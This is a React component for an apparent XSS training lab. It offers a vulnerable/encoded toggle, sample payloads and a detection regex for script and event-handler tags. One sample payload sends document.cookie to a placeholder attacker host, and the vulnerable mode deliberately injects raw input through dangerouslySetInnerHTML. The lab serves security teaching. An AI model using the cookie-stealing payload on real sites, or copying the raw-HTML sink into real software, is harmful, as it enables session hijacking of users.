import React, { useState } from 'react';
import {
  Code2,
  ShieldCheck,
  ShieldAlert,
  Play,
  RotateCcw,
  Sparkles,
  Terminal,
  AlertTriangle,
  Cookie,
  Lock,
} from 'lucide-react';
import { sound } from '../utils/audio';

interface XssLabProps {
  onEarnXp: (xp: number) => void;
}

export const XssLab: React.FC<XssLabProps> = ({ onEarnXp }) => {
  const [inputPayload, setInputPayload] = useState<string>("<img src=x onerror=alert('Session Token: ' + document.cookie)>");
  const [isEscaped, setIsEscaped] = useState<boolean>(false);
  const [renderedOutput, setRenderedOutput] = useState<string>('');
  const [simulatedExecutionAlert, setSimulatedExecutionAlert] = useState<string | null>(null);
  const [comments, setComments] = useState<string[]>([
    'Welcome to the CosmicSOC Community forum!',
    'Does anyone know when the next CTF tournament starts?',
  ]);
  const [hasSolved, setHasSolved] = useState<boolean>(false);

  const handleTestPayload = () => {
    sound.playClick();
    setRenderedOutput(inputPayload);

    if (isEscaped) {
      sound.playSuccess();
      setSimulatedExecutionAlert(null);
    } else {
      // Check if dangerous HTML / script tags
      const isDangerous =
        /<script/i.test(inputPayload) ||
        /onerror=/i.test(inputPayload) ||
        /onload=/i.test(inputPayload) ||
        /javascript:/i.test(inputPayload);

      if (isDangerous) {
        sound.playAlert();
        setSimulatedExecutionAlert(
          "⚠️ XSS EXECUTION TRIGGERED: JavaScript executed in victim context! Intercepted session cookie: 'session_token=cosmic_sec_jwt_99182a4'"
        );
        if (!hasSolved) {
          setHasSolved(true);
          onEarnXp(120);
        }
      } else {
        setSimulatedExecutionAlert(null);
      }
    }
  };

  const handleAddComment = () => {
    sound.playClick();
    if (!inputPayload.trim()) return;
    setComments([...comments, inputPayload]);
    handleTestPayload();
  };

  return (
    <div className="space-y-6 max-w-5xl mx-auto">
      {/* Title block */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 border-b border-[#1b2b40]">
        <div>
          <div className="flex items-center gap-2">
            <Code2 className="w-6 h-6 text-sky-400" />
            <h1 className="text-2xl font-bold tracking-tight text-white">
              Cross-Site Scripting (XSS) Sandbox
            </h1>
          </div>
          <p className="text-xs text-slate-400 mt-1">
            Simulate Reflected and Stored XSS attacks, session cookie hijacking, and defense via contextual output encoding.
          </p>
        </div>

        {/* Safe vs Vulnerable Switch */}
        <div className="flex items-center gap-2 bg-[#0a1019] p-1 rounded-lg border border-[#1e2f47]">
          <button
            onClick={() => {
              sound.playClick();
              setIsEscaped(false);
              setSimulatedExecutionAlert(null);
            }}
            className={`px-3 py-1.5 text-xs font-semibold rounded-md transition-colors ${
              !isEscaped
                ? 'bg-rose-950/80 text-rose-300 border border-rose-700/60'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            Vulnerable (Raw HTML)
          </button>
          <button
            onClick={() => {
              sound.playClick();
              setIsEscaped(true);
              setSimulatedExecutionAlert(null);
            }}
            className={`px-3 py-1.5 text-xs font-semibold rounded-md transition-colors ${
              isEscaped
                ? 'bg-emerald-950/80 text-emerald-300 border border-emerald-700/60'
                : 'text-slate-400 hover:text-slate-200'
            }`}
          >
            Secure (HTML Encoded)
          </button>
        </div>
      </div>

      {/* Main Interactive Editor */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        {/* Input Card */}
        <div className="bg-[#0e1724] border border-[#1b2b40] rounded-xl p-5 space-y-4">
          <label className="block text-xs font-bold uppercase tracking-wider text-slate-300">
            Submit Test Payload into Application Input
          </label>

          <textarea
            value={inputPayload}
            onChange={(e) => setInputPayload(e.target.value)}
            rows={4}
            className="w-full bg-[#080d14] border border-[#1e2f47] focus:border-cyan-500 rounded-lg p-3 text-xs font-mono text-cyan-300 focus:outline-none"
            placeholder="Enter XSS payload..."
          />

          <div className="flex gap-2">
            <button
              onClick={handleTestPayload}
              className="flex-1 inline-flex items-center justify-center gap-1.5 px-3 py-2 bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-bold text-xs rounded-lg transition-colors"
            >
              <Play className="w-3.5 h-3.5" />
              <span>Simulate Reflected Search</span>
            </button>

            <button
              onClick={handleAddComment}
              className="inline-flex items-center justify-center gap-1.5 px-3 py-2 bg-[#16253a] hover:bg-[#1c304a] text-cyan-300 font-semibold text-xs border border-cyan-800/40 rounded-lg transition-colors"
            >
              Post to Forum
            </button>
          </div>

          {/* Quick Payloads */}
          <div className="pt-2 border-t border-[#182638]">
            <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider block mb-2">
              Sample Educational XSS Payloads:
            </span>
            <div className="flex flex-col gap-1.5">
              {[
                "<img src=x onerror=alert('Session Token: ' + document.cookie)>",
                "<script>console.log('Keylogger active: ' + window.location.href)</script>",
                "<svg/onload=fetch('https://evil-c2.xyz/steal?c='+document.cookie)>",
              ].map((p) => (
                <button
                  key={p}
                  onClick={() => {
                    sound.playClick();
                    setInputPayload(p);
                  }}
                  className="text-left px-2.5 py-1.5 text-[11px] font-mono bg-[#080d14] hover:bg-[#142338] border border-[#1e2e45] text-cyan-300 rounded truncate transition-colors"
                >
                  {p}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Simulated Browser DOM Render Viewport */}
        <div className="bg-[#0e1724] border border-[#1b2b40] rounded-xl p-5 flex flex-col justify-between space-y-4">
          <div>
            <div className="flex items-center justify-between pb-2 mb-3 border-b border-[#182638]">
              <span className="text-xs font-bold text-slate-300">
                Simulated Browser DOM Viewport
              </span>
              <span className="text-[10px] font-mono text-slate-400">
                SANDBOXED
              </span>
            </div>

            <div className="bg-white rounded-lg p-4 text-slate-900 text-xs shadow-inner min-h-[140px]">
              <div className="text-[11px] text-slate-500 mb-2 font-mono pb-1 border-b border-slate-200">
                Search Results for query:
              </div>

              {isEscaped ? (
                <div className="font-mono text-slate-800 break-all">
                  {renderedOutput}
                </div>
              ) : (
                <div
                  className="font-mono text-slate-800 break-all"
                  dangerouslySetInnerHTML={{ __html: renderedOutput }}
                />
              )}
            </div>

            {/* Simulated XSS Execution Banner */}
            {simulatedExecutionAlert && (
              <div className="mt-3 p-3 rounded-lg bg-rose-950/60 border border-rose-600/70 text-xs text-rose-200 font-mono leading-relaxed">
                {simulatedExecutionAlert}
              </div>
            )}
          </div>

          {/* Defense Explanation Box */}
          <div className="p-3 rounded-lg bg-[#080d14] border border-[#182638] text-xs text-slate-300 space-y-1.5">
            <div className="flex items-center gap-2 font-bold text-cyan-400">
              <Lock className="w-3.5 h-3.5" />
              <span>Security Mitigation Matrix:</span>
            </div>
            <p className="text-[11px] text-slate-400 leading-normal">
              1. <strong>Output Encoding:</strong> Replace <code className="text-white">&lt;</code> with <code className="text-white">&amp;lt;</code> and <code className="text-white">&gt;</code> with <code className="text-white">&amp;gt;</code>.
            </p>
            <p className="text-[11px] text-slate-400 leading-normal">
              2. <strong>HttpOnly Cookies:</strong> Mark authentication cookies as <code className="text-white">HttpOnly; Secure; SameSite=Strict</code> so JavaScript cannot read them.
            </p>
            <p className="text-[11px] text-slate-400 leading-normal">
              3. <strong>Content Security Policy (CSP):</strong> Disallow inline scripts (<code className="text-white">script-src 'self'</code>).
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
